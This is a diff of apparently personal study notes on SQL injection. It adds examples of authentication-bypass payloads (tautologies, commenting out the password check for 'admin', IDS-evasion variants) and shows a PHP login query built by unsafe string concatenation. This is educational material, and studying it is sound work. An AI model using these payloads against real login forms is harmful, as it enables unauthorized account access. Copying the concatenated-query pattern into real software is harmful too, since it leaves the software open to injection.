@@ -32,7 +32,6 @@ It works by sending malicious SQL commands to the database server and the most c
 
 >[!example]
 >Authentication bypass using [[#Inband attacks|tautologies]]
->
 >##### 1.
 >1. query
 >	- `$q = "SELECT id FROM users WHERE user='".$user."' AND pass='".$pass."'";`
@@ -47,11 +46,23 @@ It works by sending malicious SQL commands to the database server and the most c
 >##### 2.
 >Choosing “blindly” the first available user
 >- `$pass = "' OR 1=1 # ";`
->	- `$q = "SELECT id FROM users WHERE user='' AND pass='' OR 1=1 # '";`
+>→ `$q = "SELECT id FROM users WHERE user='' AND pass='' OR 1=1 # '";`
 >- `$user = "' OR user LIKE '%' #";`
->	- `$q = "SELECT id FROM users WHERE user='' OR user LIKE '%' #' AND pass=''";`
+>→ `$q = "SELECT id FROM users WHERE user='' OR user LIKE '%' #' AND pass=''";`
 >- `$user = "' OR 1 # ";`
->	- `$q = "SELECT id FROM users WHERE user='' OR 1 #' AND pass=''";`
+>→ `$q = "SELECT id FROM users WHERE user='' OR 1 #' AND pass=''";`
+>
+>##### 3.
+>Choosing a known user
+>- `$user = "admin' OR 1 # ";`
+>→ `$q = "SELECT id FROM users WHERE user='admin' OR 1 #' AND pass=''";`
+>- `$user = "admin' #";`
+>→ `$q = "SELECT id FROM users WHERE user='admin' #' AND pass=''";`
+>
+>##### 4.
+>IDS evasion
+>- `$pass = "' OR 5>4 OR password='mypass";`
+>- `$pass = "' OR 'vulnerability'>'server";`
 
 ### Technique
 The SQLi attack typically works by prematurely terminating a text string and appending a new command. Because the inserted command may have additional strings appended to it before it is executed the attacker terminates the injected string with a comment mark `--` so that the subsequent text is ignored at execution time.
